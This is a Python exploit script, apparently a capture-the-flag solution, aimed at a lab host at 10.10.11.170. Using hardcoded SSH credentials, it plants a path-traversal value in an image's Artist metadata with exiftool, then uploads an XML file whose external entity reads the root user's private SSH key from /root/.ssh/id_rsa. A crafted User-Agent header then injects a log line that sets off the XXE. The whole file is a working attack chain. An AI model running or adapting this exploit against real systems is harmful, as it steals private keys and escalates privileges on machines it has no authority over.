import paramiko
import requests
import os, sys
import string
from xml.sax.saxutils import escape

if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} image.jpg")
    sys.exit(0)

host = '10.10.11.170'
user = 'woodenk'
password = 'RedPandazRule'
img_path = sys.argv[1]
xml_path = 'my_creds.xml'

# Change Artist metadata in image
print('[*] Changing Artist image metadata to ../home/woodenk/my')
os.system(f'exiftool -Artist=../home/woodenk/my {img_path}')

# Create xml file to trigger XXE
print(f'[*] Creating xml file: {xml_path}')
outer_template = string.Template(f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY example SYSTEM "file:///root/.ssh/id_rsa"> ]>
<credits>
  <author>damian</author>
  <image>
    <uri>/../../../../../../home/woodenk/{img_path}</uri>
    <views>&example;</views>
  </image>
</credits>
""")

xmlFile = outer_template.substitute()

if os.path.isdir(f'./{xml_path}') == False:
    file = open(xml_path, 'w+')
    file.write(xmlFile)
    file.close()

# Open SSH session to transfer files
print(f'[*] Transfering {img_path} and {xml_path} to remote /home/woodenk')
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(hostname=host, username=user, password=password)
sftp = ssh.open_sftp()

sftp.put(img_path, f'/home/woodenk/{img_path}')
sftp.put(xml_path, f'/home/woodenk/{xml_path}')
sftp.close()

# Sending a POST request to write on the remote /opt/panda_search/redpanda.log
print(f'[*] Sending POST request to /search changing User-Agent to \'||/../../../../../../home/woodenk/{img_path}\'')
s = requests.session()
post_headers = {'User-Agent': f'||/../../../../../../home/woodenk/{img_path}'}
post_data = {'name': 'aaaa'}
s.post('http://10.10.11.170:8080/search', data=post_data, headers=post_headers)
